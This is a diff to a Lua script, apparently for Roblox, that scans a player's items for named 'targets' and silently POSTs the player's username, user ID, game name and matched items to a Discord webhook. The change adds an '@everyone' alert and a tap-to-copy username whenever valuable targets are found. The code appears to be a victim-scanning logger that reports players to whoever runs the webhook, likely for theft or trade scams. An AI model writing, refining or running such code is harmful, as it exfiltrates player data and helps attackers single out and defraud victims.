@@ -51,20 +51,24 @@ table.insert(foundTargets,v.Name)
 end
 end
 
-local message
+local ping = ""
+if #foundTargets > 0 then
+ping = "@everyone "
+end
+
+local message =
+ping..
+"Mobile Copy\n-# **Just tap**\n`"..username.."`\n\n"..
+"User: "..username.." ("..userid..")\n"..
+"Game: "..gameName.."\n"
 
 if #foundTargets > 0 then
-message = "@everyone TARGET FOUND\n"
-message = message.."User: "..username.." ("..userid..")\n"
-message = message.."Game: "..gameName.."\nTargets:\n"
-
+message = message.."Targets:\n"
 for _,t in ipairs(foundTargets) do
 message = message.."- "..t.."\n"
 end
 else
-message = "Scan Complete (No Targets Found)\n"
-message = message.."User: "..username.." ("..userid..")\n"
-message = message.."Game: "..gameName
+message = message.."Scan Complete (No Targets Found)"
 end
 
 pcall(function()
@@ -73,7 +77,8 @@ Url = webhook,
 Method = "POST",
 Headers = {["Content-Type"] = "application/json"},
 Body = HttpService:JSONEncode({
-content = message
+content = message,
+allowed_mentions = {parse = {"everyone"}}
 })
 })
 end)
